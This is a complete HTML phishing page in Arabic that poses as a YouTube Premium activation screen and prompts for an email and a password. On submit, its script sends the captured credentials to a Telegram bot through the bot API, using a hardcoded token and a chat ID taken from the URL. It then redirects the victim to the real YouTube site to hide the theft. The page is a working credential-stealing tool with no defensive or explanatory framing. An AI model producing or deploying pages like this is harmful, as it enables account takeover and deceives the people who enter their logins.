<!DOCTYPE html>
<html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>YouTube</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#f9f9f9;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:40px;width:380px;text-align:center}
img{width:120px;margin-bottom:28px}h2{color:#1a73e8;margin-bottom:15px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px}
.btn{background:#1a73e8;color:#fff;border:none;padding:12px;width:100%;border-radius:4px;font-size:18px;font-weight:bold;cursor:pointer}.btn:hover{background:#1557b0}</style></head>
<body><div class="card">
<img src="https://www.gstatic.com/youtube/img/email/email_logo.png" alt="YouTube">
<h2>تفعيل YouTube Premium</h2>
<input id="u" placeholder="البريد الإلكتروني"><br>
<input id="p" type="password" placeholder="كلمة المرور"><br>
<button class="btn" onclick="sendData()">التالي</button>
</div>
<script>
const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";
const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');
function sendData(){const u=document.getElementById('u').value,pa=document.getElementById('p').value;
if(!u||!pa)return alert('املأ جميع الحقول');
fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('▶️ YouTube\n👤 '+u+'\n🔑 '+pa)}`)
.then(()=>{location.href='https://www.youtube.com/'})}
</script></body></html>
